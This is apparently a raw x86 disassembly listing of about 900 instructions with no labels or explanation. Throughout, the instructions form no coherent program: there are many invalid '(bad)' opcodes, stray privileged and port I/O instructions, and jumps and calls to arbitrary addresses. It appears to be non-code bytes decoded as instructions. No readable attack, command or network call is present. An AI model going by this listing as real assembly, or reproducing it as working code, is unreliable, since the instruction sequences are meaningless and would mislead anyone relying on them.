  41e85e:	dec    edi
  41e85f:	jmp    DWORD PTR [edx+0x6f]
  41e862:	les    ebx,FWORD PTR [edx-0x3e847ea5]
  41e868:	push   cs
  41e869:	xchg   ebx,eax
  41e86a:	sbb    esp,DWORD PTR [edx+0x72]
  41e86d:	lods   eax,DWORD PTR ds:[esi]
  41e86e:	fistp  WORD PTR [eax+edi*1]
  41e871:	neg    DWORD PTR [esi]
  41e873:	es dec eax
  41e875:	(bad)  
  41e876:	fnstenv [edi+0x3427a4d6]
  41e87c:	xchg   edi,eax
  41e87d:	xor    BYTE PTR [esi],dl
  41e87f:	rol    BYTE PTR [ecx],cl
  41e881:	std    
  41e882:	mov    cl,0x15
  41e884:	push   eax
  41e885:	inc    ebx
  41e886:	pop    esp
  41e887:	mov    al,ds:0xbfe90727
  41e88c:	sti    
  41e88d:	scas   eax,DWORD PTR es:[edi]
  41e88e:	xor    eax,0xaa424531
  41e893:	mov    al,dh
  41e895:	add    ebp,ebp
  41e897:	rol    BYTE PTR [edi],0xf3
  41e89a:	xchg   ebp,eax
  41e89b:	fcomp  QWORD PTR [esi+0x757eb00c]
  41e8a1:	inc    esi
  41e8a2:	xlat   BYTE PTR ds:[ebx]
  41e8a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8a4:	mov    dl,BYTE PTR [esp+ecx*8-0x57]
  41e8a8:	dec    ebp
  41e8a9:	ins    BYTE PTR es:[edi],dx
  41e8aa:	and    ecx,DWORD PTR [ebx+0x2b]
  41e8ad:	and    eax,0xb077579b
  41e8b2:	inc    ebp
  41e8b3:	(bad)  
  41e8b4:	shr    ebx,1
  41e8b6:	or     ebp,DWORD PTR [esi+0x79]
  41e8b9:	fst    DWORD PTR [edx]
  41e8bb:	pop    edi
  41e8bc:	repz aaa 
  41e8be:	or     eax,0xf107e1c5
  41e8c3:	mov    ds:0xee23947,eax
  41e8c8:	std    
  41e8c9:	inc    esp
  41e8cb:	mov    ebp,0xdb65ac69
  41e8d0:	jno    0x41e8b1
  41e8d2:	imul   DWORD PTR [ebx-0x18c1094b]
  41e8d8:	fidivr WORD PTR [esi-0x450b0c3]
  41e8de:	int    0xef
  41e8e0:	jno    0x41e872
  41e8e2:	sub    BYTE PTR [edx+0x34],dl
  41e8e5:	inc    ebp
  41e8e6:	xchg   ecx,eax
  41e8e7:	xchg   edx,eax
  41e8e8:	sub    BYTE PTR [ecx-0x4e],dh
  41e8eb:	retfw  0x6d0e
  41e8ef:	imul   ecx,DWORD PTR [eax-0x1fb1db79],0xc
  41e8f6:	or     bl,BYTE PTR [esp]
  41e8f9:	inc    ecx
  41e8fa:	mov    WORD PTR [esi+eax*4],fs
  41e8fd:	aas    
  41e8fe:	xchg   ecx,eax
  41e8ff:	dec    esp
  41e900:	adc    BYTE PTR [eax],dh
  41e902:	mov    DWORD PTR [ebx+0x28e24b7c],eax
  41e908:	mov    BYTE PTR [ecx],al
  41e90a:	(bad)  
  41e90b:	enter  0x3a24,0x6
  41e90f:	les    ebp,FWORD PTR [eax-0x80]
  41e912:	sub    al,0x52
  41e914:	mov    ds:0x69928949,al
  41e919:	aas    
  41e91a:	dec    ecx
  41e91b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e91c:	cmp    BYTE PTR [edx+0x20],ch
  41e91f:	stc    
  41e920:	data16 neg ah
  41e923:	mov    bh,0xef
  41e925:	jo     0x41e8f5
  41e927:	fnstcw WORD PTR [ebx-0x53]
  41e92a:	stos   BYTE PTR es:[edi],al
  41e92b:	jl     0x41e8d5
  41e92d:	pop    edx
  41e92e:	jnp    0x41e8cf
  41e930:	data16 sbb al,0xec
  41e934:	test   DWORD PTR [eax+0x6fbba01c],0xbdc67b9f
  41e93e:	ja     0x41e995
  41e940:	std    
  41e941:	jmp    0x41e9a2
  41e943:	jmp    FWORD PTR [edx-0x2d12d09e]
  41e949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e94a:	add    eax,0xa3331aca
  41e94f:	call   0x90439d9c
  41e954:	jne    0x41e8fa
  41e956:	int    0x53
  41e958:	push   edx
  41e959:	dec    ecx
  41e95a:	je     0x41e8dd
  41e95c:	sar    DWORD PTR [esi+edx*2+0x14],cl
  41e960:	in     al,dx
  41e961:	je     0x41e92d
  41e963:	inc    esi
  41e964:	adc    eax,DWORD PTR [ebx-0x2698de91]
  41e96a:	sub    eax,0xcfbdfb38
  41e96f:	jno    0x41e964
  41e971:	xchg   edi,eax
  41e972:	(bad)  
  41e974:	mov    edx,0x7e4ffd5f
  41e979:	icebp  
  41e97a:	fnstsw WORD PTR [edi-0x15]
  41e97d:	out    0x7f,eax
  41e97f:	jmp    0x2df8:0xc6c2ff13
  41e986:	ficomp WORD PTR [esi-0x2b]
  41e989:	test   eax,0x79041fc0
  41e98e:	clc    
  41e98f:	aam    0x29
  41e991:	fnstcw WORD PTR [edi-0x2]
  41e994:	ficomp WORD PTR [edi-0x6f]
  41e997:	pushf  
  41e998:	mov    edx,0xe76f25dc
  41e99d:	mov    WORD PTR [eax+edx*2-0xe],ds
  41e9a1:	mov    BYTE PTR [ebp-0x36],dh
  41e9a4:	mov    ecx,0x2adcdf5d
  41e9a9:	mov    dh,0x4f
  41e9ab:	sub    bh,BYTE PTR [ebx+0x5908eed4]
  41e9b1:	add    BYTE PTR [eax],cl
  41e9b3:	xchg   esi,eax
  41e9b4:	les    esi,FWORD PTR [edi-0x5c66db44]
  41e9ba:	mov    ebp,DWORD PTR [edx-0x56c0395]
  41e9c0:	add    BYTE PTR [ebp-0x5bda77dc],ch
  41e9c6:	and    al,0x3a
  41e9c8:	jmp    0x41ea06
  41e9ca:	inc    edi
  41e9cb:	lods   al,BYTE PTR ds:[esi]
  41e9cc:	(bad)  
  41e9cd:	push   0xffffffac
  41e9cf:	sbb    al,0x1e
  41e9d1:	sub    DWORD PTR [edx],esi
  41e9d3:	je     0x41e9b9
  41e9d5:	pushf  
  41e9d6:	std    
  41e9d7:	mov    ecx,0xb0249d2b
  41e9dc:	adc    cl,BYTE PTR [edx+0x79]
  41e9df:	inc    esp
  41e9e0:	call   0xf00078a0
  41e9e5:	dec    ecx
  41e9e6:	and    al,0xaa
  41e9e8:	sub    DWORD PTR [edi+0xc],eax
  41e9eb:	mov    al,ds:0xb90c94b0
  41e9f0:	jecxz  0x41ea42
  41e9f2:	dec    ebx
  41e9f3:	mov    ah,0xb8
  41e9f5:	cmp    bh,BYTE PTR es:[edx+0x2c]
  41e9f9:	ja     0x41e997
  41e9fb:	int    0x3b
  41e9fd:	in     al,dx
  41e9fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9ff:	and    eax,0x5a948d83
  41ea04:	js     0x41ea82
  41ea06:	icebp  
  41ea07:	push   esi
  41ea08:	jmp    0x14fc:0x3e3fc7b0
  41ea0f:	out    dx,eax
  41ea10:	cmp    al,0xfb
  41ea12:	push   ds
  41ea13:	mov    cs,edx
  41ea15:	dec    ebp
  41ea16:	ds jg  0x41ea15
  41ea19:	es mov esi,0x3e9e4ba1
  41ea1f:	mov    ebx,0xc74599cb
  41ea24:	dec    ebp
  41ea25:	jae    0x41e9c4
  41ea27:	jge    0x41ea33
  41ea29:	fnstsw WORD PTR [edi-0x18]
  41ea2c:	pop    ecx
  41ea2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea2e:	rcr    DWORD PTR [ebx],0xf8
  41ea31:	xlat   BYTE PTR ds:[ebx]
  41ea32:	es pop es
  41ea34:	and    al,0x7
  41ea36:	ja     0x41ea3c
  41ea38:	add    eax,0x8e7f3d7
  41ea3d:	jp     0x41ea6a
  41ea3f:	pushf  
  41ea40:	pop    ss
  41ea41:	push   0xfb917cb5
  41ea46:	retf   
  41ea47:	jnp    0x41e9de
  41ea49:	push   esi
  41ea4a:	jecxz  0x41ea5b
  41ea4c:	xchg   ebp,eax
  41ea4d:	pop    ds
  41ea4e:	out    dx,al
  41ea4f:	push   esp
  41ea50:	or     cl,dh
  41ea52:	inc    BYTE PTR [ebx+0x4d8aeec3]
  41ea58:	mov    al,0x9f
  41ea5a:	mov    BYTE PTR [ebp+ecx*8-0x6dccf592],ch
  41ea61:	outs   dx,BYTE PTR ds:[esi]
  41ea62:	rcr    ebx,0xb4
  41ea65:	inc    ebp
  41ea66:	jg     0x41ea01
  41ea68:	inc    esi
  41ea69:	jo     0x41eab8
  41ea6b:	sar    BYTE PTR [edi+0xb],1
  41ea6e:	cwde   
  41ea6f:	stos   BYTE PTR es:[edi],al
  41ea70:	add    eax,0xd3a16c9
  41ea75:	xor    DWORD PTR [edi+0x7d],ebp
  41ea78:	jbe    0x41eaeb
  41ea7a:	shl    esi,1
  41ea7c:	pop    eax
  41ea7d:	scas   al,BYTE PTR es:[edi]
  41ea7e:	out    0x5c,al
  41ea80:	xor    al,0x6c
  41ea82:	scas   eax,DWORD PTR es:[edi]
  41ea83:	cmp    DWORD PTR [ebx],esi
  41ea85:	fistp  DWORD PTR [edx+0x3d03100f]
  41ea8b:	pop    edx
  41ea8c:	ja     0x41eaae
  41ea8e:	dec    esp
  41ea8f:	jmp    0x4e6:0x9c4e56de
  41ea96:	ins    BYTE PTR es:[edi],dx
  41ea97:	stc    
  41ea98:	test   eax,0xaf4c04c6
  41ea9d:	and    bl,bl
  41ea9f:	cwde   
  41eaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaa1:	cmp    eax,0xb541c256
  41eaa6:	daa    
  41eaa7:	outs   dx,DWORD PTR ds:[esi]
  41eaa8:	mov    bl,0x6
  41eaaa:	imul   ebx,DWORD PTR ss:[esi],0x3074df04
  41eab1:	or     eax,0xe2e11417
  41eab6:	(bad)  
  41eab7:	mov    edi,0xff7e9fc4
  41eabc:	call   0xe1df:0x9e7d1c2f
  41eac3:	nop
  41eac4:	(bad)  
  41eac5:	xchg   esi,eax
  41eac6:	lock (bad) 
  41eac8:	cld    
  41eac9:	sbb    BYTE PTR [ebx-0x17],bh
  41eacc:	add    al,0xcb
  41eace:	mov    ah,0x44
  41ead0:	inc    esp
  41ead1:	rcr    al,1
  41ead3:	cli    
  41ead4:	test   BYTE PTR [esi-0xfc2a56c],cl
  41eada:	push   ecx
  41eadb:	sub    BYTE PTR [edx-0x4e065233],ch
  41eae1:	ror    DWORD PTR [ebx-0x39],0x8e
  41eae5:	je     0x41eaf9
  41eae7:	or     DWORD PTR [edi-0x5eaa2ae6],ebx
  41eaed:	and    BYTE PTR [esp+edi*1-0x620c4f7],bl
  41eaf4:	bound  ebx,QWORD PTR [esi-0x1]
  41eaf7:	shr    ecx,0x7f
  41eafa:	repz ret 
  41eafc:	iret   
  41eafd:	outs   dx,BYTE PTR ds:[esi]
  41eafe:	ds cmc 
  41eb00:	mov    bh,0x9e
  41eb02:	pop    eax
  41eb03:	outs   dx,BYTE PTR ds:[esi]
  41eb04:	jae    0x41eacb
  41eb06:	scas   eax,DWORD PTR es:[edi]
  41eb07:	(bad)  
  41eb09:	push   ebp
  41eb0a:	sbb    DWORD PTR gs:[edi],edi
  41eb0d:	or     BYTE PTR [esi+edi*8-0x6],bh
  41eb11:	cdq    
  41eb12:	push   esp
  41eb13:	(bad)  
  41eb14:	repnz outs dx,DWORD PTR ds:[esi]
  41eb16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb17:	pushf  
  41eb18:	push   edx
  41eb19:	retf   
  41eb1a:	std    
  41eb1b:	dec    ebp
  41eb1c:	xchg   ebp,eax
  41eb1d:	pop    edx
  41eb1e:	sub    ch,ah
  41eb20:	mov    WORD PTR [edi+edx*8],cs
  41eb23:	test   DWORD PTR [ecx+0x53],esi
  41eb26:	sbb    ecx,0x5d
  41eb29:	push   eax
  41eb2a:	pop    es
  41eb2b:	pop    edi
  41eb2c:	push   ds
  41eb2d:	dec    ecx
  41eb2e:	sub    BYTE PTR [ebx+0x22f9a72c],bh
  41eb34:	add    edx,DWORD PTR [edi+ebx*8]
  41eb37:	hlt    
  41eb38:	loop   0x41eb20
  41eb3a:	fwait
  41eb3b:	dec    eax
  41eb3c:	sub    ebx,edx
  41eb3e:	xchg   ecx,eax
  41eb3f:	mov    cl,0xd
  41eb41:	fmul   DWORD PTR [eax]
  41eb43:	ret    
  41eb44:	cmp    BYTE PTR [edx-0x48],dh
  41eb47:	sbb    bl,cl
  41eb49:	fisttp WORD PTR [esp+ebx*1]
  41eb4c:	scas   al,BYTE PTR es:[edi]
  41eb4d:	push   es
  41eb4e:	je     0x41eb23
  41eb50:	and    ebp,0xad827c80
  41eb56:	inc    ecx
  41eb57:	ss push es
  41eb59:	loop   0x41ebd8
  41eb5b:	add    ebx,ecx
  41eb5d:	scas   al,BYTE PTR es:[edi]
  41eb5e:	jecxz  0x41eb24
  41eb60:	mov    ds:0x10efa767,al
  41eb65:	xor    DWORD PTR [esi+0x48ea3232],eax
  41eb6b:	jno    0x41eaf6
  41eb6d:	sbb    ah,BYTE PTR [ebx]
  41eb6f:	outs   dx,BYTE PTR ds:[esi]
  41eb70:	mov    al,0x2a
  41eb72:	mov    esi,0x1d4bbe17
  41eb77:	je     0x41ebb6
  41eb79:	cmp    ebp,DWORD PTR [ecx-0x3f]
  41eb7c:	and    al,bl
  41eb7e:	sub    DWORD PTR [ebp-0x23c9ac47],0xb2fd85a9
  41eb88:	dec    edi
  41eb89:	cmp    eax,0xbd2f08be
  41eb8e:	or     DWORD PTR [edi-0x22],0x7a
  41eb92:	or     DWORD PTR [edi-0x13],0x293f81bf
  41eb99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb9a:	cmp    BYTE PTR [ebp-0x345d3c49],bh
  41eba0:	pop    esp
  41eba1:	(bad)  
  41eba2:	cmp    BYTE PTR [eax+0x68bf6845],ah
  41eba8:	fist   DWORD PTR [edx+0x477049dc]
  41ebae:	sub    esi,0xffffffb1
  41ebb1:	push   edi
  41ebb2:	xchg   ebx,eax
  41ebb3:	stc    
  41ebb4:	xor    DWORD PTR [ebx+0x11bedd79],esp
  41ebba:	push   0x7f11b003
  41ebbf:	fcom   QWORD PTR [eax]
  41ebc1:	scas   eax,DWORD PTR es:[edi]
  41ebc2:	xor    eax,0x7307e3c4
  41ebc7:	inc    edx
  41ebc8:	mov    cl,0x0
  41ebca:	imul   esi,DWORD PTR [ecx],0xffffffdf
  41ebcd:	mov    WORD PTR [edi+ebp*4],ss
  41ebd0:	sub    ecx,esi
  41ebd2:	pop    esp
  41ebd3:	xor    esi,DWORD PTR [edi]
  41ebd5:	(bad)  
  41ebd6:	fcmovu st,st(6)
  41ebd8:	shl    DWORD PTR [esi+0x39],cl
  41ebdb:	jo     0x41ebea
  41ebdd:	inc    edi
  41ebde:	push   eax
  41ebdf:	or     al,0x77
  41ebe1:	mov    eax,0x3b702e51
  41ebe6:	ja     0x41ebcb
  41ebe8:	lahf   
  41ebe9:	push   ss
  41ebea:	cld    
  41ebeb:	outs   dx,BYTE PTR ds:[esi]
  41ebec:	mov    eax,ds:0xbad2b05
  41ebf1:	jo     0x41ec09
  41ebf3:	add    bh,BYTE PTR [ecx+0x16]
  41ebf6:	mov    eax,ds:0x19a0ce1
  41ebfb:	pop    ebx
  41ebfc:	in     al,0xe4
  41ebfe:	mov    bl,0x14
  41ec00:	xlat   BYTE PTR ds:[ebx]
  41ec01:	and    al,dl
  41ec03:	test   DWORD PTR [ebx-0xd],esp
  41ec06:	or     BYTE PTR es:[edx-0x51],ch
  41ec0a:	and    eax,0x96c8c9c1
  41ec0f:	mov    ds:0x33f76681,eax
  41ec14:	loopne 0x41ec85
  41ec16:	sar    BYTE PTR [esi+0x76],1
  41ec19:	or     al,BYTE PTR [edx]
  41ec1b:	es inc ecx
  41ec1d:	add    dh,BYTE PTR [edx-0x3c1d2a1b]
  41ec23:	dec    ebp
  41ec24:	inc    ecx
  41ec25:	jg     0x41ebd5
  41ec27:	pop    es
  41ec28:	js     0x41ebdf
  41ec2a:	fisttp DWORD PTR gs:[ecx-0x3b]
  41ec2e:	out    dx,eax
  41ec2f:	fwait
  41ec30:	rol    DWORD PTR [eax+0x78],cl
  41ec33:	out    dx,al
  41ec34:	(bad)  
  41ec35:	mov    esp,0xff9f67c2
  41ec3a:	adc    ebx,DWORD PTR [esi-0x45]
  41ec3d:	jl     0x41ec41
  41ec3f:	xchg   ebp,eax
  41ec40:	or     eax,0x74c90119
  41ec45:	imul   ebx,DWORD PTR [ecx],0x43ec627c
  41ec4b:	sub    al,0x82
  41ec4d:	stos   BYTE PTR es:[edi],al
  41ec4e:	mov    dl,0xb6
  41ec50:	xchg   ecx,eax
  41ec51:	and    bl,BYTE PTR [esi-0x6c]
  41ec54:	dec    ebp
  41ec55:	push   0x494d059b
  41ec5a:	inc    edx
  41ec5b:	dec    ebp
  41ec5c:	xchg   ebp,eax
  41ec5d:	stos   BYTE PTR es:[edi],al
  41ec5e:	and    esp,DWORD PTR [esi+0xa21588a]
  41ec64:	aam    0x98
  41ec66:	fs push es
  41ec68:	xor    eax,0xe878ea72
  41ec6d:	popf   
  41ec6e:	iret   
  41ec6f:	inc    ebx
  41ec70:	aad    0x1f
  41ec72:	(bad)  
  41ec73:	pop    ss
  41ec74:	mov    bl,0xbe
  41ec76:	pop    es
  41ec77:	mov    ebx,0x3a6abd
  41ec7c:	add    DWORD PTR [esi],edi
  41ec7e:	add    dh,dl
  41ec80:	sbb    edi,DWORD PTR [edi-0x5]
  41ec83:	pop    ss
  41ec84:	fisub  WORD PTR [esi-0x6d6ddc3a]
  41ec8a:	dec    eax
  41ec8b:	jb     0x41ec91
  41ec8d:	push   eax
  41ec8e:	dec    ebx
  41ec8f:	inc    ecx
  41ec90:	retf   
  41ec91:	mov    BYTE PTR [edx],dh
  41ec93:	mov    edx,0x55c1c791
  41ec98:	jo     0x41ecf6
  41ec9a:	in     al,dx
  41ec9b:	dec    ebp
  41ec9c:	push   ebp
  41ec9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec9e:	sub    bh,BYTE PTR [esi-0x64dfb993]
  41eca4:	ror    BYTE PTR [ecx-0x19],1
  41eca7:	xor    esi,esp
  41eca9:	mov    ds:0xa3893d77,eax
  41ecae:	xor    BYTE PTR [ecx+0x5d],0xa8
  41ecb2:	imul   ebp,DWORD PTR [edi-0x3538500d],0xffffffe6
  41ecb9:	mov    eax,0xca571c30
  41ecbe:	cmp    ah,BYTE PTR [ecx+0x6b]
  41ecc1:	inc    ebp
  41ecc2:	aad    0xd9
  41ecc4:	stos   BYTE PTR es:[edi],al
  41ecc5:	cmp    dl,BYTE PTR [esp+ebp*4+0x7a]
  41ecc9:	mov    bh,0xd6
  41eccb:	xor    ch,BYTE PTR [edi]
  41eccd:	pop    eax
  41ecce:	out    0x9e,al
  41ecd0:	popf   
  41ecd1:	fcom   QWORD PTR [ecx+0x323a560c]
  41ecd7:	mov    WORD PTR [ebx-0x34],es
  41ecda:	ret    
  41ecdb:	test   esi,0x8295a2c0
  41ece1:	mov    ecx,0x55334468
  41ece6:	cmp    eax,DWORD PTR [ebp+eax*1+0x6659e827]
  41eced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecee:	fcmove st,st(0)
  41ecf0:	stos   BYTE PTR es:[edi],al
  41ecf1:	push   ss
  41ecf2:	out    dx,al
  41ecf3:	jmp    0xc3eb:0xe2b28dc0
  41ecfa:	aaa    
  41ecfb:	pop    eax
  41ecfc:	sub    al,0x17
  41ecfe:	cld    
  41ecff:	rol    ebp,1
  41ed01:	outs   dx,DWORD PTR ds:[esi]
  41ed02:	jecxz  0x41ed77
  41ed04:	cld    
  41ed05:	or     BYTE PTR [edi+0x4e],bl
  41ed08:	pop    ss
  41ed09:	loope  0x41ecef
  41ed0b:	dec    ecx
  41ed0c:	into   
  41ed0d:	sub    al,0x3a
  41ed0f:	push   cs
  41ed10:	or     DWORD PTR [ebp+0x26cc9112],0x6a884ee1
  41ed1a:	inc    ebx
  41ed1b:	push   ss
  41ed1c:	sbb    al,0xc6
  41ed1e:	int3   
  41ed1f:	cmp    al,0x8e
  41ed21:	stos   DWORD PTR es:[edi],eax
  41ed22:	stos   BYTE PTR es:[edi],al
  41ed23:	xor    DWORD PTR [eax+0x26faf94d],ebx
  41ed29:	or     al,0x7d
  41ed2b:	(bad)  
  41ed2c:	(bad)  
  41ed2d:	(bad)  
  41ed2f:	fldpi  
  41ed31:	cli    
  41ed32:	mov    bl,0xa1
  41ed34:	mov    bh,0xfb
  41ed36:	inc    esi
  41ed37:	adc    eax,0xb36b6b06
  41ed3c:	lds    ebx,FWORD PTR ds:0xe47c7b4b
  41ed42:	fdiv   QWORD PTR [ecx-0x78]
  41ed45:	es pop esp
  41ed47:	(bad)  
  41ed49:	pop    ss
  41ed4a:	adc    bl,dl
  41ed4c:	ja     0x41ed22
  41ed4e:	mov    bh,0xe9
  41ed50:	stos   BYTE PTR es:[edi],al
  41ed51:	imul   edi,DWORD PTR [esi+ecx*2+0x6b33e3d3],0xa97a220b
  41ed5c:	(bad)  
  41ed5d:	div    DWORD PTR [ecx+0x4a146459]
  41ed63:	push   cs
  41ed64:	mov    dh,0x35
  41ed66:	clc    
  41ed67:	sbb    al,BYTE PTR [ebx+0x54]
  41ed6a:	imul   ebp,DWORD PTR [ecx-0x62cdccb8],0x196d81f1
  41ed74:	mov    ds:0xcda04ee1,al
  41ed79:	sbb    bh,BYTE PTR [edx-0x79b3f031]
  41ed7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed81:	push   es
  41ed82:	fstp   TBYTE PTR [edi+0x1fd6d16c]
  41ed88:	xor    ebx,DWORD PTR es:[edx-0x70]
  41ed8c:	lods   eax,DWORD PTR ds:[esi]
  41ed8d:	(bad)  
  41ed8e:	mov    dh,0xef
  41ed90:	aam    0xfe
  41ed92:	out    dx,eax
  41ed93:	pop    ds
  41ed94:	jp     0x41ed6c
  41ed96:	and    ah,al
  41ed98:	das    
  41ed99:	mov    edx,0xfce6713e
  41ed9e:	dec    ecx
  41ed9f:	inc    edi
  41eda0:	ss lahf 
  41eda2:	jle    0x41edcb
  41eda4:	das    
  41eda5:	xchg   ebp,eax
  41eda6:	scas   eax,DWORD PTR es:[edi]
  41eda7:	jb     0x41ed4a
  41eda9:	xchg   DWORD PTR [ebx],ebp
  41edab:	cmp    edx,DWORD PTR [edi+0xf1da659]
  41edb1:	dec    ebp
  41edb2:	out    0x1b,al
  41edb4:	mov    DWORD PTR [edi],esi
  41edb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb7:	mov    al,0xd1
  41edb9:	dec    edx
  41edba:	test   eax,0x292280de
  41edbf:	mov    bl,0x4c
  41edc1:	mov    ebp,0x48127d57
  41edc6:	mov    bl,BYTE PTR [ecx-0x34]
  41edc9:	xchg   bh,ah
  41edcb:	popa   
  41edcc:	adc    al,0x30
  41edce:	fild   WORD PTR [ebx-0x28]
  41edd1:	gs and ebp,esi
  41edd4:	sbb    eax,0x38168f46
  41edd9:	cmc    
  41edda:	in     al,0x1d
  41eddc:	repnz lds edi,FWORD PTR [ebx-0x69]
  41ede0:	(bad)  
  41ede1:	sar    DWORD PTR [edi-0x4],1
  41ede4:	dec    ebx
  41ede5:	jg     0x41edd0
  41ede7:	ret    
  41ede8:	iret   
  41ede9:	outs   dx,BYTE PTR ds:[esi]
  41edea:	repnz aas 
  41edec:	xlat   BYTE PTR ds:[ebx]
  41eded:	adc    BYTE PTR [edi],bl
  41edef:	loopne 0x41ede7
  41edf1:	stos   BYTE PTR es:[edi],al
  41edf2:	call   0x704907f7
  41edf7:	out    0x99,eax
  41edf9:	shl    BYTE PTR [bp-0x1],cl
  41edfd:	clc    
  41edfe:	scas   eax,DWORD PTR es:[edi]
  41edff:	dec    edx
  41ee00:	daa    
  41ee01:	sub    DWORD PTR [ebp+0x3e],esi
  41ee04:	add    cl,BYTE PTR [ecx-0x2b]
  41ee07:	sub    BYTE PTR [ebx+0x65],ah
  41ee0a:	pop    esp
  41ee0b:	push   ebp
  41ee0c:	(bad)  
  41ee0d:	pop    es
  41ee0e:	and    ebx,DWORD PTR [eax-0x1907a34e]
  41ee14:	mov    DWORD PTR [ebx+0x17d621f5],esp
  41ee1a:	ror    BYTE PTR [ecx-0x7feb9b87],cl
  41ee20:	fs pop ds
  41ee22:	stos   BYTE PTR es:[edi],al
  41ee23:	nop
  41ee24:	(bad)  
  41ee25:	shl    BYTE PTR [esi+0x640bd755],1
  41ee2b:	test   BYTE PTR [edx],dh
  41ee2d:	adc    al,0x4a
  41ee2f:	ror    DWORD PTR [ecx-0x54],1
  41ee32:	xor    cl,BYTE PTR [edx+ecx*2+0x3c25a02d]
  41ee39:	mov    al,0x8
  41ee3b:	inc    esi
  41ee3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee3d:	mov    edx,0x570e8f20
  41ee42:	add    eax,0x8e63c84a
  41ee47:	(bad)  
  41ee48:	adc    eax,0x46fa3aab
  41ee4d:	sbb    esi,DWORD PTR [edx]
  41ee4f:	and    eax,0x7215da1b
  41ee54:	sub    cl,BYTE PTR [eax-0x69]
  41ee57:	leave  
  41ee58:	xchg   edx,eax
  41ee59:	sbb    bh,al
  41ee5b:	les    esi,FWORD PTR [ecx-0x77]
  41ee5e:	in     eax,0x9b
  41ee60:	or     cl,BYTE PTR [eax+0x65]
  41ee63:	mov    ds:0xb9450703,eax
  41ee68:	stos   DWORD PTR es:[edi],eax
  41ee69:	and    ebp,DWORD PTR [ebx-0x7a0aeea6]
  41ee6f:	pushf  
  41ee70:	fimul  DWORD PTR ds:0x9f8f080c
  41ee76:	aas    
  41ee77:	leave  
  41ee78:	jmp    0x41eea8
  41ee7a:	pushf  
  41ee7b:	loop   0x41ee79
  41ee7d:	outs   dx,BYTE PTR ds:[esi]
  41ee7e:	iret   
  41ee7f:	cmp    cl,BYTE PTR [ecx]
  41ee81:	inc    edi
  41ee82:	popa   
  41ee83:	les    ebx,FWORD PTR [esi]
  41ee85:	jno    0x41ee84
  41ee87:	add    ch,BYTE PTR [esi+eax*4-0x22]
  41ee8b:	out    dx,al
  41ee8c:	sub    edx,DWORD PTR [esi]
  41ee8e:	loop   0x41eeac
  41ee90:	sbb    al,0xaa
  41ee92:	pop    ss
  41ee93:	mov    al,ds:0x607f5e84
  41ee98:	mov    cs,eax
  41ee9a:	arpl   sp,di
  41ee9c:	imul   edx,ecx,0x18139be
  41eea2:	pop    eax
  41eea3:	jecxz  0x41ee76
  41eea5:	mov    edi,0xc78abcfd
  41eeaa:	push   esi
  41eeab:	imul   edi,DWORD PTR [edi-0x7e0f774d],0x57a22226
  41eeb5:	or     esp,DWORD PTR [ebp-0x5f]
  41eeb8:	mov    ecx,0xcf0c2033
  41eebd:	int3   
  41eebe:	sub    ebp,DWORD PTR [ecx]
  41eec0:	xor    eax,0xecfb5050
  41eec5:	aad    0x88
  41eec7:	push   0x3ff331d
  41eecc:	inc    esi
  41eecd:	xor    al,0xad
  41eecf:	mov    edi,0xb574606
  41eed4:	pop    es
  41eed5:	fdiv   QWORD PTR [edx+0xb]
  41eed8:	mov    ch,0x30
  41eeda:	cld    
  41eedb:	push   es
  41eedc:	sets   BYTE PTR [ecx]
  41eedf:	mov    ebp,0xbf5b0766
  41eee4:	add    ecx,DWORD PTR [edi+0x410edbb8]
  41eeea:	jne    0x41eeca
  41eeec:	push   ebp
  41eeed:	shl    BYTE PTR [edx+0x7f0583bd],1
  41eef3:	aam    0x96
  41eef5:	scas   al,BYTE PTR es:[edi]
  41eef6:	call   0x50dae6b9
  41eefb:	(bad)  
  41eefc:	hlt    
  41eefd:	loop   0x41ef35
  41eeff:	xchg   ecx,eax
  41ef00:	(bad)  
  41ef01:	adc    edx,DWORD PTR [edi]
  41ef03:	adc    BYTE PTR [eax-0x3c],ch
  41ef06:	daa    
  41ef07:	sbb    cl,bh
  41ef09:	mov    BYTE PTR ds:0x4ef61500,al
  41ef0f:	das    
  41ef10:	adc    BYTE PTR [ecx],dl
  41ef12:	outs   dx,BYTE PTR ds:[esi]
  41ef13:	mov    esi,0x73bd8b7c
  41ef18:	ret    0xb7d9
  41ef1b:	push   DWORD PTR [ecx]
  41ef1d:	xchg   ebp,eax
  41ef1e:	mov    ebx,0xe976ec9c
  41ef23:	call   0xbaecf5f0
  41ef28:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41ef2a:	(bad)  
  41ef2b:	mov    WORD PTR [edx+0x5a032861],?
  41ef31:	xchg   DWORD PTR [eax+0x5e],esi
  41ef34:	cmp    eax,0xb1a0590b
  41ef39:	ins    DWORD PTR es:[edi],dx
  41ef3a:	test   eax,0xaadbe493
  41ef3f:	sbb    al,0xa0
  41ef41:	nop
  41ef42:	mov    ebx,0x7dc72584
  41ef47:	sub    DWORD PTR [ecx+0x665abe04],edi
  41ef4d:	mov    ecx,0xb4ba1d8
  41ef52:	dec    esi
  41ef53:	sahf   
  41ef54:	dec    eax
  41ef55:	pushf  
  41ef56:	jle    0x41ef43
  41ef58:	or     ebx,DWORD PTR [ecx-0x79]
  41ef5b:	repnz scas eax,DWORD PTR es:[edi]
  41ef5d:	mov    al,0xd
  41ef5f:	push   edi
  41ef60:	pop    esi
  41ef61:	(bad)
  41ef64:	ror    BYTE PTR [ebx],cl
  41ef66:	jo     0x41ef4d
  41ef68:	retf   0xf915
  41ef6b:	jns    0x41efb5
  41ef6d:	mov    edi,0x58df5bf8
  41ef72:	stos   BYTE PTR es:[edi],al
  41ef73:	icebp  
  41ef74:	xchg   ebx,eax
  41ef75:	test   ebx,0x528b437f
  41ef7b:	mov    DWORD PTR [edx+0x3d],0xb7a9890
  41ef82:	pop    es
